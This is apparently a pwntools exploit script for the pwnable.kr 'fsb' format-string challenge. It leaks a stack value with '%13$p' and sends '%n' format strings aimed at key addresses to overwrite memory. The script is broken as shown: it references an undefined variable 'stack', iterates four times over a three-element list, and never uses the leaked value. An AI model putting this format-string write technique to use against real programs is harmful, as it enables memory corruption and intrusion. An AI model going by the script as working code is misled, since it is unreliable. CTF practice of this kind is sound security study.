from pwn import *

# shell = ssh('fsb', 'pwnable.kr', password='guest', port=2222)
# p = shell.run('./fsb')
# p = gdb.debug('./fsb', '''
# b *0x08048615
# c
# ''')
p = process('./fsb')
# gdb.attach(p, gdbscript='''
# break fsb
# continue
# ''')

key  = 0x0804a060
key2 = 0x0804a064

formats = [
  p32(key)  + b'%n',
  p32(key2) + b'%n',
  p32(key + 1) + b'%n'
]

p.recvuntil(b'Give me some format strings(1)\n')
p.sendline(b'%13$p')
target = int(p.recvline(), 16)
print(target)

p.recvline()
p.sendline(p32(stack))

for i in range(4):
  p.recvuntil('Give me some format strings(' + str(i+1) + ')')
  p.sendline(formats[i])

p.recvuntil('key :')
p.sendline('1024')

p.interactive()
